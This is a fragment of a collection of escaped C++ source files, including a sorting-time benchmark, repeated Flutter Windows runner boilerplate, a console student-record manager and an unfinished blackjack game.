int i=0; i<dimv; i++){\n            w[i] = rand();\n        }\n        vector<double> w_copia = w;\n\n        time_Bubble += TimeBubble(w);\n        time_Merge += TimeMerge(w_copia);\n    }\n    double time_BubbleSort_w = time_Bubble/iters;\n    double time_MergeSort_w = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a random doubles vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_w << endl\n         << \"MergeSort : \" << time_MergeSort_w << endl << endl;\n\n\n    // Vector of ascending ordered integers\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    vector<int> v_copia = v;\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v3 = time_Bubble/iters;\n    double time_MergeSort_v3 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a ordered integers vector\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v3 << endl\n         << \"MergeSort : \" << time_MergeSort_v3 << endl << endl;\n\n\n    unsigned int half_dim = dimv/2;\n    // Vector of ordered integers with the fist half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=0; i<half_dim; i++){\n            v[i] = rand() % half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v1 = time_Bubble/iters;\n    double time_MergeSort_v1 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the fist half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v1 << endl\n         << \"MergeSort : \" << time_MergeSort_v1 << endl << endl;\n\n\n    // Vector of ordered integers with the second half perturbed\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    for (unsigned int num_iter = 0; num_iter < iters; num_iter++){\n        for (unsigned int i=half_dim; i<dimv; i++){\n            v[i] = rand() % dimv + half_dim;\n        }\n        vector<int> v_copia = v;\n\n        time_Bubble += TimeBubble(v);\n        time_Merge += TimeMerge(v_copia);\n    }\n    double time_BubbleSort_v2 = time_Bubble/iters;\n    double time_MergeSort_v2 = time_Merge/iters;\n    cout << \"Time in nanoseconds needed for sorting a integers vector with the second half of elements perturbed\" << endl\n         << \"Bubblesort: \" << time_BubbleSort_v2 << endl\n         << \"MergeSort : \" << time_MergeSort_v2 << endl << endl;\n\n\n    // Vector of ordered integers which elements have been switched in pairs\n    time_Bubble = 0;\n    time_Merge = 0;\n    n = 0;\n    generate(v.begin(),v.end(),[&n] () {return n++;});\n    int dimv_floor = (dimv/2)*2;\n    for (unsigned int ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "//PROJECT: Student Record Management System using C++\n//Written by Md Zakaullah\n#include<iostReam>\nusing namespace std;\nstring Roll_no[30],name[30],Class[30],course[30],mobile_no[30],admission_year[30];\nint total=0;\nvoid Enter()\n{\nint ch=0;\ncout<<\"How many students do u want to Enter??\"<<endl;\ncin>>ch;\nif(total==0)\n{\ntotal=ch+total;\nfor(int i=0;i<ch;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO:: \"<<endl;\ncin>>Roll_no[i];\ncout<<\"Enter Name: \"<<endl;\ncin>>name[i];\ncout<<\"Enter Class: \"<<endl;\ncin>>Class[i];\ncout<<\"Enter Course: \"<<endl;\ncin>>course[i];\ncout<<\"Enter Mobile NO: \"<<endl;\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \"<<endl;\ncin>>admission_year[i];\n}\n}\nelse\n{\nfor(int i=total;i<ch+total;i++)\n{\ncout<<\"\\nEnter the Data of student \"<<i+1<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter Course: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\ntotal=ch+total;\n}\n}\nvoid show()\n{\nif(total==0)\n{\ncout<<\"No Data is Entered\"<<endl;\n}\nelse\n{\nfor(int i=0;i<total;i++)\n{\ncout<<\"\\nData of Student \"<<i+1<<endl<<endl;\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\nvoid search()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse\n{\nstring Rollno;\ncout<<\"Enter the Roll no of student\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"Roll NO \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"CouRse \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\n}\n}\n}\n}\nvoid update()\n{\nif(total==0)\n{\ncout<<\"No data is Entered\"<<endl;\n}\nelse{\nstring Rollno;\ncout<<\"Enter the Roll no of student which you want to update\"<<endl;\ncin>>Rollno;\nfor(int i=0;i<total;i++)\n{\nif(Rollno==Roll_no[i])\n{\ncout<<\"\\nPrevious data\"<<endl<<endl;\ncout<<\"Data of Student \"<<i+1<<endl;\ncout<<\"Roll NO: \"<<Roll_no[i]<<endl;\ncout<<\"Name \"<<name[i]<<endl;\ncout<<\"Class \"<<Class[i]<<endl;\ncout<<\"Course \"<<course[i]<<endl;\ncout<<\"Mobile NO \"<<mobile_no[i]<<endl;\ncout<<\"Admission YeaR \"<<admission_year[i]<<endl;\ncout<<\"\\nEnter new data\"<<endl<<endl;\ncout<<\"Enter Roll NO \";\ncin>>Roll_no[i];\ncout<<\"Enter Name: \";\ncin>>name[i];\ncout<<\"Enter Class: \";\ncin>>Class[i];\ncout<<\"Enter CouRse: \";\ncin>>course[i];\ncout<<\"Enter Mobile NO: \";\ncin>>mobile_no[i];\ncout<<\"Enter Admission Year: \";\ncin>>admission_year[i];\n}\n}\n}\n}\nvoid Delete()\n{\nif(total==0)\n{\ncout<<\"No data is Entered yet\"<<endl;\n}\nelse\n{\nint a;\ncout<<\"Are you Sure to Delete Data?\"<<endl;\ncout<<\"Press 1 to delete all Record\"<<endl;\ncin>>a;\nif(a==1)\n{\ntotal=0;\ncout<<\"All Record is deleted..!!\"<<endl;\n}\nelse\n{\ncout<<\"Please Press 1 to Delete All Record\"<<endl;\n}\n}\n}\nint main() \n{\nint value;\nwhile(true)\n{\ncout<<\"\\nPress 1 to Enter data\"<<endl<<endl;\ncout<<\"PRess 2 to Show data\"<<endl<<endl;\ncout<<\"PRess 3 to Search data\"<<endl<<endl;\ncout<<\"Press 4 to Update data\"<<endl<<endl;\ncout<<\"Press 5 to Delete data\"<<endl<<endl;\ncout<<\"Press 6 to Quit\"<<endl<<endl;\ncin>>value;\nswitch(value)\n{\ncase 1:\nEnter();\nbreak;\ncase 2:\nshow();\nbreak;\ncase 3:\nsearch();\nbreak;\ncase 4:\nupdate();\nbreak;\ncase 5:\nDelete();\nbreak;\ncase 6:\nexit(0);\nbreak;\ndefault:\ncout<<\"Invalid input\"<<endl;\nbreak;\n}\n}\n}",
    "\r\n#include <iostream>\r\n#include <stdlib.h>\r\nint Choice;\r\nint HitFunction(int PlayerHitHand);\r\nint SplitHitFunction(int SplitHitHand1);\r\nint SplitHit2Function(int SplitHitHand2);\r\nint SplitStay(int DealerHand);\r\nint StayFunction(int DealerStayHand);\r\nusing std::cout;\r\nusing std::cin;\r\nusing std::endl;\r\nint main()\r\n{\r\n\tsrand(static_cast<int>(time(NULL)));\r\n\tbool Play = true;\r\n\tbool Splitplay = false;\r\n\tint DealerCard1 = rand() % 11 + 1;\r\n\tint DealerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard1 = rand() % 11 + 1;\r\n\tint PlayerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard3 = rand() % 11 + 1;\r\n\tint PlayerCard4 = rand() % 11 + 1;\r\n\tint DealerHand = DealerCard1 + DealerCard2;\r\n\tint PlayerHand = PlayerCard1 + PlayerCard2;\r\n\tif (PlayerCard1 && PlayerCard2 == 11)\r\n\t{\r\n\t\tPlayerCard1 -= 1;\r\n\t\tcout << \"Playercard1 is now equal to: \" << PlayerCard1 << endl;\r\n\t}\r\n\tif (DealerCard1 && DealerCard2 == 11)\r\n\t{\r\n\t\tDealerCard1 -= 1;\r\n\t\tcout << \"Dealercard1 is now equal to: \" << DealerCard1 << endl;\r\n\t}\r\n\tif (DealerHand == 21)\r\n\t{\r\n\t\tcout << \"Dealer has a natural blackjack you lose!\" << endl;\r\n\t\tPlay = false;\r\n\t\tSplitplay = false;\r\n\t\treturn 0;\r\n\t}\r\nif (PlayerCard1 == PlayerCard2 || Splitplay == true)\r\n{\r\n\t\t\r\nchar YesNo;\r\ncout << \"Your first card: \" << PlayerCard1 << \" \" << \"Your second card: \" << PlayerCard2 << endl;\r\ncout << \"Would you like to split?\" << endl;\r\ncout << \"Y/N\" << endl;\r\ncin >> YesNo;\r\nint PlayerHandSplit1 = PlayerCard1 + PlayerCard3;\r\nint PlayerHandSplit2 = PlayerCard2 + PlayerCard4;\r\nif (YesNo == 'Y' || YesNo == 'y')\r\n{\r\n\tdo\r\n\t{\r\n\t\tbool Hit1 = true;\r\n\t\tbool Hit = true;\r\n\t\tSplitplay = true;\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit1)\r\n\t{\r\n\t\tPlayerHandSplit1 += SplitHitFunction(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n        \tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\tif (PlayerHandSplit1 > 21 || PlayerHandSplit2 > 21)\r\n\t{\r\n\t\tcout << \"You busted! You lose!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit1 = false;\r\n\t}\r\n\tchar YesNo;\r\n\tcout << \"Would you like to hit again?\" << endl;\r\n\tcout << \"Y/N?\" << endl;\r\n\tcin >> YesNo;\r\n\tif (YesNo == 'Y' || YesNo == 'y')\r\n\t{\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\tHit1 = false;\r\n\t}\r\n\t}\r\n\tbreak;\r\n\tcase 2:\r\n\twhile (DealerHand <= 16)\r\n\t{\r\n\t\tDealerHand += SplitStay(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Player:\" << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2\r\n\t\t<< \" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tHit1 = false;\r\n\t\tSplitplay = false;\r\n\t\tPlay = false;\r\n\tif (DealerHand > 21)\r\n\t{\r\n\t\tcout << \"Dealer busted! You win!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit = false;\r\n\t\tPlay = false;\r\n\t}\r\n\t}\r\n\t\t\t\t\t\t\r\n\tbreak;\r\n\tdefault:\r\n\tbreak;\r\n\t}\r\n\tif (Play == true)\r\n\t{\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"For second hand hit?\" << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit)\r\n\t{\r\n\t\tPlayerHandSplit2 += SplitHit2Function(PlayerHandSplit2);\r\n\t\tcout << \"Dealer:\" ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    